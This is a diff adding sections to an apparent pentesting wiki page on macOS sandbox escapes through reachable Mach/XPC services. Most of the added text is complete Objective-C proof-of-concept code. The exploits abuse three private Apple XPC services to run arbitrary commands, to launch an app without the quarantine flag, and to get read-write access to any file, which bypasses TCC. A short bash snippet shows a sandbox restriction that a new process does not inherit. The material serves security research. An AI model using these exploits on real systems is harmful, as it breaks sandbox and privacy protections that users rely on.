@@ -59,6 +59,162 @@ If from then sandbox process you are able to **compromise other processes** runn
 ../../../macos-proces-abuse/
 {{#endref}}
 
+### Available System and User Mach services
+
+The sandbox also allow to communicate with certain **Mach services** via XPC defined in the profile `application.sb`. If you are able to **abuse** one of these services you might be able to **escape the sandbox**.
+
+As indicated in [this writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), the info about Mach services is stored in `/System/Library/xpc/launchd.plist`. It's possible to find all the System and User Mach services by searching inside that file for `<string>System</string>` and `<string>User</string>`.
+
+Moreover, it's possible to check if a Mach service is available to a sandboxed application by calling the `bootstrap_look_up`:
+
+```objectivec
+void checkService(const char *serviceName) {
+    mach_port_t service_port = MACH_PORT_NULL;
+    kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
+    if (!err) {
+      NSLog(@"available service:%s", serviceName);
+      mach_port_deallocate(mach_task_self_, service_port);
+    }
+}
+
+void print_available_xpc(void) {
+    NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
+    NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
+    for (NSString* key in launchDaemons) {
+      NSDictionary<NSString*, id>* job = launchDaemons[key];
+      NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
+      for (NSString* serviceName in machServices) {
+          checkService(serviceName.UTF8String);
+      }
+    }
+}
+```
+
+### Available PID Mach services
+
+These Mach services were firstly abused to [escape from the sandbox in this writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). By that time, **all the XPC services required** by an application and its framework were visible in the app's PID domain (these are Mach Services with `ServiceType` as `Application`).
+
+In order to **contact a PID Domain XPC service**, it's just needed to register it inside the app with a line such as:
+
+```objectivec
+[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
+```
+
+Moreover, It's possible to find all the **Application** Mach services by searching inside `System/Library/xpc/launchd.plist` for `<string>Application</string>`.
+
+Another way to find valid xpc services is to check the ones in:
+
+```bash
+find /System/Library/Frameworks -name "*.xpc"
+find /System/Library/PrivateFrameworks -name "*.xpc"
+```
+
+Several examples abusing this technique can be found in the [**original writeup**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), however, the following are some sumarized examples.
+
+#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc
+
+This services allows every XPC connection by returning always `YES` and the method `runTask:arguments:withReply:` executes an arbitrary command with arbitrary params.
+
+The exploit was "as simple as":
+
+```objectivec
+@protocol SKRemoteTaskRunnerProtocol
+-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
+@end
+
+void exploit_storagekitfsrunner(void) {
+    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
+    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
+    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
+    [conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
+    [conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
+    [conn resume];
+    
+    [[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
+        NSLog(@"run task result:%@, error:%@", bSucc, error);
+    }];
+}
+```
+
+#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc
+
+This XPC service allowed every client bu always returning YES and the method `createZipAtPath:hourThreshold:withReply:` basically allowed to indicate the path to a folder to compress and it'll compress it in a ZIP file.
+
+Therefore, it's possible to generate a fake app folder structure, compress it, then decompress and execute it to escape the sandbox as the new files won't have the quarantine attribute.
+
+The exploit was:
+
+```objectivec
+@protocol AudioAnalyticsHelperServiceProtocol
+-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
+-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
+@end
+void exploit_AudioAnalyticsHelperService(void) {
+    NSString *currentPath = NSTemporaryDirectory();
+    chdir([currentPath UTF8String]);
+    NSLog(@"======== preparing payload at the current path:%@", currentPath);
+    system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
+    [@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
+    system("chmod +x compressed/poc.app/Contents/MacOS/poc");
+    
+    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
+    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
+    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
+    [conn resume];
+    
+    [[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
+        NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
+        NSString *file;
+        while ((file = [dirEnum nextObject])) {
+            if ([[file pathExtension] isEqualToString: @"zip"]) {
+                // open the zip
+                NSString *cmd = [@"open " stringByAppendingString:file];
+                system([cmd UTF8String]);
+
+                sleep(3); // wait for decompression and then open the payload (poc.app)
+                NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
+                system([cmd2 UTF8String]);
+                break;
+            }
+        }
+    }];
+}
+```
+
+#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc
+
+This XPC service allows to give read and write access to an arbitarry URL to the XPC client via the method `extendAccessToURL:completion:` which accepted any connection. As the XPC service has FDA, it's possible to abuse these permissions to bypass TCC completely.
+
+The exploit was:
+
+```objectivec
+@protocol WFFileAccessHelperProtocol
+- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
+@end
+typedef int (*PFN)(const char *);
+void expoit_ShortcutsFileAccessHelper(NSString *target) {
+    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
+    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
+    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
+    [conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
+    [conn resume];
+    
+    [[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
+        NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
+        NSURL *targetURL = [fpWrapper url];
+        
+        void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
+        PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
+        if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
+            NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
+        else {
+            NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
+            NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
+        }
+    }];
+}
+```
+
 ### Static Compiling & Dynamically linking
 
 [**This research**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) discovered 2 ways to bypass the Sandbox. Because the sandbox is applied from userland when the **libSystem** library is loaded. If a binary could avoid loading it, it would never get sandboxed:
@@ -74,6 +230,27 @@ Note that **even shellcodes** in ARM64 needs to be linked in `libSystem.dylib`:
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
+
+### Not inherited restrictions
+
+As explined in the **[bonus of this writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)** a sandbox restriction like:
+
+```
+(version 1)
+(allow default)
+(deny file-write* (literal "/private/tmp/sbx"))
+```
+
+can be bypassed by a new process executing for example:
+
+```bash
+mkdir -p /tmp/poc.app/Contents/MacOS
+echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
+chmod +x /tmp/poc.app/Contents/MacOS/poc
+open /tmp/poc.app
+```
+
+However, of course, this new process won't inherit entitlements or privileges from the parent process.
 
 ### Entitlements
 
